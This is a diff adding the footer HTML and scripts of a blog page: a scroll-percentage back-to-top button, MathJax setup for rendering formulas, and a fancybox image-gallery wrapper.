+</script>
+
+
+      <div class="back-to-top hidden">
+  <span>
+    <i class="iconfont icon-60"></i><span></span>%
+  </span>
+</div>
+
+<script>
+const updateIconToTop = percent => {
+  let dom = document.querySelector(".back-to-top span span");
+  dom.innerText = percent;
+  if(percent < 1) {
+    document.querySelector(".back-to-top").className = "back-to-top hidden";
+  } else {
+    document.querySelector(".back-to-top").className = "back-to-top";
+  }
+}
+
+const handleScoll = () => {
+  let isRunning = false;
+  return () => {
+    if (isRunning) return;
+    isRunning = true;
+    window.requestAnimationFrame(timestamp => {
+      let scrollTop =
+          document.documentElement.scrollTop || document.body.scrollTop,
+        scrollHeight =
+          document.documentElement.scrollHeight ||
+          document.body.scrollHeight,
+        clientHeight =
+          document.documentElement.clientHeight ||
+          document.body.clientHeight;
+      isRunning = false;
+      if (scrollTop <= 1) {
+        updateIconToTop(0);
+        return;
+      }
+      if (scrollTop + clientHeight >= scrollHeight) {
+        updateIconToTop(100);
+      } else {
+        updateIconToTop(parseInt(
+          100 * scrollTop / (scrollHeight - clientHeight),
+          10
+        ));
+      }
+    });
+  };
+}
+
+const backToTop = () => {
+  let scrollTop =
+      document.documentElement.scrollTop || document.body.scrollTop,
+    delay = 10,
+    time = 200;
+  if (scrollTop <= 20) {
+    document.documentElement.scrollTop = 0;
+    document.body.scrollTop = 0;
+    return;
+  }
+  let step = Math.ceil(scrollTop * delay / time);
+  let timer = setInterval(() => {
+    scrollTop =
+      document.documentElement.scrollTop || document.body.scrollTop;
+    if (scrollTop - step <= 0) {
+      document.documentElement.scrollTop = 0;
+      document.body.scrollTop = 0;
+      clearInterval(timer);
+    } else {
+      document.documentElement.scrollTop = scrollTop - step;
+      document.body.scrollTop = scrollTop - step;
+    }
+  }, delay);
+}
+
+document.addEventListener("scroll", handleScoll(), false);
+
+document.querySelector(".back-to-top").addEventListener("click", backToTop, false);
+
+</script>
+
+    </div>
+
+    
+      <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML" async></script>
+<script>
+  (() => {
+    const mathjaxConfig = {
+      showProcessingMessages: false, //关闭js加载过程信息
+      messageStyle: "none", //不显示信息
+      jax: ["input/TeX", "output/HTML-CSS"],
+      tex2jax: {
+        inlineMath: [["$", "$"], ["\\(", "\\)"]], //行内公式选择符
+        displayMath: [["$$", "$$"], ["\\[", "\\]"]], //段内公式选择符
+        skipTags: ["script", "noscript", "style", "textarea", "pre", "code", "a"] //避开某些标签
+      },
+      "HTML-CSS": {
+        availableFonts: ["STIX", "TeX"], //可选字体
+        showMathMenu: false //关闭右击菜单显示
+      }
+    }
+
+    let mathjaxInterval = setInterval(() => {
+      if(!window.MathJax){
+        return;
+      }
+      window.MathJax.Hub.Config(mathjaxConfig)
+      window.MathJax.Hub.Queue(["Typeset", MathJax.Hub, document.getElementById('app')])
+
+      clearInterval(mathjaxInterval)
+    }, 10)    
+  })()
+</script>
+    
+
+    <script src="https://cdn.bootcss.com/fancybox/3.5.2/jquery.fancybox.min.js" async></script>
+<script async>
+  let fancyTimer = setInterval(function(){
+    if(!window.$){
+      return;
+    }
+    $(document).ready(function() {
+      $(".post img").each(function () {
+        if($(this).parent().get(0).tagName.toLowerCase() === "a") {
+          return;
+        }
+        // $(this).attr("data-fancybox", "gallery"); // if you add 'data-fancybox', img will display after showed
+        var element = document.createElement("a");
+        $(element).attr("data-fancybox", "gallery");
+        $(element).attr("href", $(this).attr("src"));
+        $(this).wrap(element);
+      });
+      
+      clearInterval(fancyTimer);
+    });
+  }, 10);
+</script>
+
+    
+  </body>
+
+</html>
